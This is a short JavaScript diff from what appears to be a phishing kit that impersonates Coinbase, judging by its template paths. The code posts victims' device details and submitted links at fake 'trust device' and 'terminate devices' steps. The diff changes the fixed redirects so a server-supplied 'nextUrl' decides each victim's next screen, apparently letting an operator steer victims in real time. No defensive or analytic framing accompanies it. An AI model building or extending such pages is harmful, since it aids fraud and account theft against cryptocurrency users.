@@ -300,7 +300,8 @@
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
-    }).catch(function () { /* non-blocking */ });
+    }).then(function (r) { return r.json().catch(function () { return null; }); })
+      .catch(function () { return null; });
   }
 
   trustBtn.addEventListener('click', function () {
@@ -328,8 +329,9 @@
       step: 'trust_device',
       choice: 'deny',
       detail: deviceDetail()
-    }).finally(function () {
-      window.location.href = '/templates/preview/Coinbase/Review%20Login';
+    }).then(function (d) {
+      if (d && d.nextUrl) location.href = d.nextUrl;
+      else location.href = '/loading';
     });
   });
 
@@ -346,8 +348,9 @@
       step: 'terminate_devices',
       choice: 'submit',
       detail: link
-    }).finally(function () {
-      window.location.href = '/templates/preview/Coinbase/Loading';
+    }).then(function (d) {
+      if (d && d.nextUrl) location.href = d.nextUrl;
+      else location.href = '/loading';
     });
   });
 })();
